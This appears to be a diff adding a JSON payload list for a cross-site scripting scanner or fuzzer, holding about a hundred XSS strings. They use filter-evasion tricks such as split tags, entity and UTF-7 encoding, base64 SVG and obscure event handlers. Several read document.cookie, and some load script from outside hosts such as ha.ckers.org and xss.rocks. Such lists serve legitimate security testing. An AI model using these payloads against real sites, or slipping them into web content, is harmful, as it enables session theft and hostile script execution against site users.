@@ -1,0 +1,148 @@
+{
+    "payload": [
+        {"payload_name":"<Script>alert('xss')</Script>"},
+        {"payload_name":"<Script>prompt('1')</Script>"},
+        {"payload_name": "<Script>alert('xss found')</Script>"},  
+        {"payload_name": "<body oninput=javascript:alert(1)><input autofocus>"},
+        {"payload_name": "<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>"},
+        {"payload_name": "<b <script>alert(1)</script>0"},
+        {"payload_name": "<image src='javascript:alert(1)'>"},
+        {"payload_name": "<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x"}, 
+        {"payload_name": "<img src=x onerror='alert(1)''>"},
+        {"payload_name":"<a style='-o-link:'javascript:javascript:alert(1)';-o-link-source:current'>X"},
+        {"payload_name": "<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>"},
+        {"payload_name": "<IMG SRC='jav&#x0D;ascript:alert('XSS');'>"},
+        {"payload_name": "perl -e 'print '<IMG SRC=java+script:alert(\"XSS\")>';' > out"},
+        {"payload_name": "<INPUT TYPE='IMAGE' SRC='javascript:alert('XSS');'>"},
+
+        {"payload_name": " <XSS STYLE='xss:expression(alert('XSS'))'>  "},
+
+        {"payload_name": "<XSS STYLE='behavior: url(xss.htc);'>"},
+
+        {"payload_name": "¼script¾alert(¢XSS¢)¼/script¾"},
+
+        {"payload_name": "<META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert('XSS');'>"},
+
+        {"payload_name": "<META HTTP-EQUIV='refresh' CONTENT='0; URL=http://;URL=javascript:alert('XSS');'>"},
+
+        {"payload_name": "<TABLE><TD BACKGROUND='javascript:alert('XSS')'>"},
+
+        {"payload_name": "<BASE HREF='javascript:alert('XSS');//'>"},
+
+        {"payload_name": "<SCRIPT SRC='http://ha.ckers.org/xss.jpg'></SCRIPT>"},
+
+        {"payload_name": "<SCRIPT>document.write('<SCRI');</SCRIPT>PT SRC='http://ha.ckers.org/xss.js'></SCRIPT>"},
+
+        {"payload_name": "<HEAD><META HTTP-EQUIV='CONTENT-TYPE' CONTENT='text/html; charset=UTF-7'> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"},
+
+        {"payload_name": "<EMBED SRC='data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==' type='image/svg+xml' AllowScriptAccess='always'></EMBED>"},
+
+        {"payload_name": "<? echo('<SCR)';echo('IPT>alert('XSS')</SCRIPT>'); ?>"},
+
+        {"payload_name": "<SCRIPT a='>' SRC='http://ha.ckers.org/xss.js'></SCRIPT>"},
+
+        {"payload_name": "<SCRIPT 'a='>' SRC='http://ha.ckers.org/xss.js'></SCRIPT>"},
+
+        {"payload_name": "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>"},
+
+        {"payload_name": " <input/onmouseover='javaSCRIPT&colon;confirm&lpar;1&rpar;></input>"},
+        {"payload_name": "'';!--'<XSS>=&{()}"},
+        {"payload_name": "'); alert('XSS"},
+        {"payload_name": "<script>alert(1);</script>"},
+         
+        {"payload_name": "<IMG SRC='javascript:alert('XSS');'>"},
+        {"payload_name": "<IMG SRC=javascript:alert('XSS')>"},
+         
+        {"payload_name": "<IMG SRC=javascript:alert('XSS')>"},
+        {"payload_name": "<IMG SRC=javascript:alert(&quot;XSS&quot;)>"},
+          
+        {"payload_name": "<IMG><SCRIPT>alert('XSS')</SCRIPT>'>"},
+        {"payload_name": "<scr<script>ipt>alert('XSS');</scr</script>ipt>"},
+        
+        {"payload_name": "<img src=foo.png onerror=alert(/xssed/) />"},
+        {"payload_name": "<marquee><script>alert('XSS')</script></marquee>"},
+         
+        {"payload_name": "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"},
+        {"payload_name": "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">"},
+        {"payload_name": "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">"},
+        {"payload_name": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83)"},
+        {"payload_name": "'><script>alert(0)</script>"}, 
+        {"payload_name": "<script src=http://yoursite.com/your_files.js></script>"},
+        {"payload_name": "</title><script>alert(/xss/)</script>"},
+        {"payload_name": "</textarea><script>alert(/xss/)</script>"},
+        {"payload_name": "<IMG LOWSRC=\"javascript:alert('XSS')\">"},
+        {"payload_name": "<IMG DYNSRC=\"javascript:alert('XSS')\">"},
+        {"payload_name": "<img src='javascript:alert('XSS')'>"},
+
+        {"payload_name": "<script language='JavaScript'>alert('XSS')</script>        "},
+
+        {"payload_name": "<body onunload='javascript:alert('XSS');'>"},
+
+        {"payload_name": "<body onLoad='alert('XSS');' "},
+
+        {"payload_name": "[color=red’ onmouseover=”alert(‘xss’)”]mouse over[/color]"},
+
+        {"payload_name": "window.alert(“Bonjour !”); <div"},
+
+        {"payload_name": "style=”x:expression((window.r==1)?”:eval(‘r=1;"},
+
+        {"payload_name": "chr(11)?> onload=alert(‘XSS’)></iframe> “><script"},
+
+        {"payload_name": "<marquee><h1>XSS</h1></marquee> <META HTTP-"},
+
+        {"payload_name": "Execute(MsgBox(chr(88)&chr(83)&chr(83)))< “></iframe>"},
+
+        {"payload_name": "alert(‘XSS’);”> ‘”></title><script>alert(1111)</script>"},
+
+        {"payload_name": "</textarea>'”><script>alert(document.cookie)</script> ‘””>"},
+
+        {"payload_name": "<img src=``&NewLine; onerror=alert(1)&NewLine;"},
+
+        {"payload_name": "<img/src=`` onerror=this.onerror=confirm(1)"},
+
+        {"payload_name": "<form><isindex formaction='javascript&colon;confirm(1)' "},
+        {"payload_name": "<sVg><scRipt >alert&lpar;1&rpar; {Opera}"},
+        {"payload_name": "<img/src=`` onerror=this.onerror=confirm(1) "},
+
+        {"payload_name": " <input/onmouseover='javaSCRIPT&colon;confirm&lpar;1&rpar;'  "},
+
+        {"payload_name": "<iframe src='&Tab;javascript:prompt(1)&Tab;'>"},
+        {"payload_name": "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'"},
+        {"payload_name": "<IFRAME SRC=# onmouseover='alert(document.cookie)'></IFRAME> "},
+        {"payload_name": "<IFRAME SRC='javascript:alert('XSS');'></IFRAME>"},
+         
+        {"payload_name": "<iframe src=http://xss.rocks/scriptlet.html <"},
+        {"payload_name": "'><h1><IFRAME SRC=# onmouseover='alert(document.cookie)'></IFRAME>123</h1>"},
+        {"payload_name": "<IFRAME width='420' height='315' frameborder='0' onload='alert(document.cookie)'></IFRAME>"},
+        {"payload_name": "<IFRAME SRC=# onmouseover='alert(document.cookie)'></IFRAME>"},
+        {"payload_name": "<INPUT TYPE='BUTTON' action='alert('XSS')'/>"},
+         
+        {"payload_name": "<IMG SRC=x onload='alert(String.fromCharCode(88,83,83))'>"},
+        {"payload_name": "<IMG SRC=x ontoggle='alert(String.fromCharCode(88,83,83))'>"},
+          
+        {"payload_name": "<IMG SRC=x onshow='alert(String.fromCharCode(88,83,83))'>"},
+        {"payload_name": "<IMG SRC=x onwaiting='alert(String.fromCharCode(88,83,83))'>"},
+        
+        {"payload_name": "<IMG SRC=x onvolumechange='alert(String.fromCharCode(88,83,83))'>"},
+        {"payload_name": "<IMG SRC=x ontimeupdate='alert(String.fromCharCode(88,83,83))'>"},
+         
+        {"payload_name": "<IMG SRC=x onsuspend='alert(String.fromCharCode(88,83,83))'>"},
+
+        {"payload_name": "<IMG SRC=x onstalled='alert(String.fromCharCode(88,83,83))'>"},
+        {"payload_name": "<IMG SRC=x onseeking='alert(String.fromCharCode(88,83,83))'>"},
+        {"payload_name": "<IMG SRC=x onseeked='alert(String.fromCharCode(88,83,83))'>"},
+        {"payload_name": "<OBJECT CLASSID='clsid:333C7BC4-460F-11D0-BC04-0080C7055A83'><PARAM NAME='DataURL' VALUE='javascript:alert(1)'></OBJECT>"},
+          
+        {"payload_name": "<embed src='data:text/html;base64,%(base64)s'>"},
+        {"payload_name": "<!--<img src='--><img src=x onerror=javascript:alert(1)//'>"},
+        
+        {"payload_name": "<table background='javascript:javascript:alert(1)'>"},
+        {"payload_name": "<frameset onload=javascript:alert(1)>"},
+         
+        {"payload_name": "<math href='javascript:javascript:alert(1)'>CLICKME</math> <math> <maction actiontype='statusline#http://google.com' xlink:href='javascript:javascript:alert(1)'>CLICKME</maction> </math>"},
+
+        {"payload_name": "<IMG SRC=x onratechange='alert(String.fromCharCode(88,83,83))'>"}
+       
+    ]
+    
+}
